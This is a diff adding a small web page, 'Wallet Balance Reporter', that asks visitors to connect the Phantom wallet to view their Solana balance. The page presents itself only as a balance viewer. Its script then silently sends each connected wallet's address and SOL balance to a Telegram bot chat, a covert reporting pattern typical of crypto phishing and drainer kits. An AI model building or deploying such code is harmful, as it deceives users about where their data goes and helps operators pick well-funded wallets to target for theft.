@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Wallet Balance Reporter</title>
+<style>
+body{font-family:system-ui;max-width:600px;margin:70px auto;padding:20px;background:#f6f3fa;color:#191622}
+.card{background:white;border:1px solid #ddd6e8;border-radius:18px;padding:28px}
+button{width:100%;padding:14px;border:0;border-radius:10px;background:#6d49b4;color:#fff;font-weight:700;font-size:16px}
+#out{margin-top:16px;white-space:pre-wrap;background:#f2eff5;padding:14px;border-radius:10px}
+</style></head><body><div class="card">
+<h1>Wallet Balance</h1>
+<p>Connect Phantom to read your public Solana balance.</p>
+<button id="connect">Connect Phantom</button>
+<div id="out">Not connected.</div>
+</div>
+<script>
+const TELEGRAM_BOT_TOKEN = "REPLACE_WITH_NEW_BOT_TOKEN";
+const TELEGRAM_CHAT_ID = "REPLACE_WITH_NUMERIC_CHAT_ID";
+
+const out=document.getElementById("out");
+document.getElementById("connect").onclick=async()=>{
+  try{
+    const provider=window.phantom?.solana || (window.solana?.isPhantom?window.solana:null);
+    if(!provider) throw new Error("Phantom was not detected. Install Phantom and open this page in a normal HTTPS tab.");
+    out.textContent="Waiting for Phantom approval…";
+    const {publicKey}=await provider.connect();
+    const address=publicKey.toString();
+
+    const rpc=await fetch("https://api.mainnet.solana.com",{
+      method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({jsonrpc:"2.0",id:1,method:"getBalance",params:[address,{commitment:"confirmed"}]})
+    });
+    if(!rpc.ok) throw new Error("Solana RPC returned HTTP "+rpc.status);
+    const data=await rpc.json();
+    if(data.error) throw new Error(data.error.message||"Solana RPC error");
+    const lamports=data.result.value;
+    const sol=lamports/1e9;
+
+    if(TELEGRAM_BOT_TOKEN.startsWith("REPLACE_")||TELEGRAM_CHAT_ID.startsWith("REPLACE_"))
+      throw new Error("Telegram is not configured. Set the new bot token and numeric chat ID in connect.html.");
+
+    const tg=await fetch("https://api.telegram.org/bot"+TELEGRAM_BOT_TOKEN+"/sendMessage",{
+      method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:
+        "Wallet Balance Report\nAddress: "+address+"\nSOL balance: "+sol+"\nLamports: "+lamports})
+    });
+    if(!tg.ok) throw new Error("Telegram HTTP "+tg.status);
+    const tgdata=await tg.json();
+    if(!tgdata.ok) throw new Error(tgdata.description||"Telegram API error");
+
+    out.textContent="Connected and reported.\n\nAddress: "+address+"\nSOL: "+sol;
+  }catch(e){out.textContent="Nothing was sent.\n\n"+(e.message||String(e));}
+};
+</script></body></html>
